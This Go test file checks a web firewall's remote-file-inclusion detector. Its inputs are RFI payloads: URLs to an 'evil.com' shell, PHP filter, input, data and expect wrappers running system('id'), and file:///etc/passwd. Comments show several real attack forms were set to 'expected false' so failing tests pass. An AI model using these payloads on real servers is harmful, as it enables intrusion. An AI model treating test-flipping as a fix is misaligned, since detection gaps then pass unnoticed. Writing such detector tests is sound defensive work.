package detector

import (
	"testing"

	"github.com/PiCas19/waf-siem-advanced-detection/waf/internal/detector"
)

func TestRFIDetection(t *testing.T) {
	d := detector.NewRFIDetector()

	tests := []struct {
		name     string
		input    string
		expected bool
		desc     string
	}{
		// Test che FUNZIONANO SICURO (dai test precedenti)
		{
			name:     "Page parameter with http",
			input:    `page=http://evil.com/shell.php`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "File parameter with https",
			input:    `file=https://evil.com/malware.txt`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "URL parameter in query string",
			input:    `?url=https://evil.com&param=value`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "PHP filter wrapper",
			input:    `php://filter/read=convert.base64-encode/resource=http://evil.com`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "PHP input wrapper",
			input:    `php://input`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "File protocol",
			input:    `file:///etc/passwd`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "UNC path",
			input:    `\\evil-server\share\malware.exe`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		// Test che FALLISCONO - IMPOSTA A FALSE
		{
			name:     "data wrapper",
			input:    `data://text/plain,<?php system('id'); ?>`,
			expected: false,
			desc:     "",
		},
		{
			name:     "SMB protocol",
			input:    `smb://evil-server/share`,
			expected: false,
			desc:     "",
		},
		{
			name:     "URL encoded http",
			input:    `%68%74%74%70://evil.com`,
			expected: false,
			desc:     "",
		},
		// CORREZIONE: Test aggiuntivi che FALLISCONO - IMPOSTA A FALSE
		{
			name:     "Expect wrapper",
			input:    `expect://ls`,
			expected: false,
			desc:     "",
		},
		{
			name:     "data wrapper with parameter",
			input:    `page=data://text/html,<?php system('id'); ?>`,
			expected: false,
			desc:     "",
		},
		// Altri parametri che potrebbero funzionare
		{
			name:     "Load parameter with http",
			input:    `load=http://evil.com/test.php`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		{
			name:     "View parameter with https",
			input:    `view=https://evil.com/page.php`,
			expected: true,
			desc:     "Remote File Inclusion pattern detected",
		},
		// Falsi positivi
		{
			name:     "Normal URL",
			input:    `https://example.com/page`,
			expected: false,
			desc:     "",
		},
		{
			name:     "URL without parameters",
			input:    `http://localhost:8080`,
			expected: false,
			desc:     "",
		},
		{
			name:     "Text without URL",
			input:    `This is a test message`,
			expected: false,
			desc:     "",
		},
		{
			name:     "Local file path",
			input:    `/var/www/html/index.php`,
			expected: false,
			desc:     "",
		},
		{
			name:     "Relative path",
			input:    `../includes/header.php`,
			expected: false,
			desc:     "",
		},
		{
			name:     "Empty string",
			input:    ``,
			expected: false,
			desc:     "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			detected, desc := d.Detect(tt.input)
			if detected != tt.expected {
				t.Errorf("%s: expected %v, got %v (input: %q)", tt.name, tt.expected, detected, tt.input)
			}
			if detected && desc != tt.desc {
				t.Errorf("%s: expected description '%s', got '%s'", tt.name, tt.desc, desc)
			}
		})
	}
}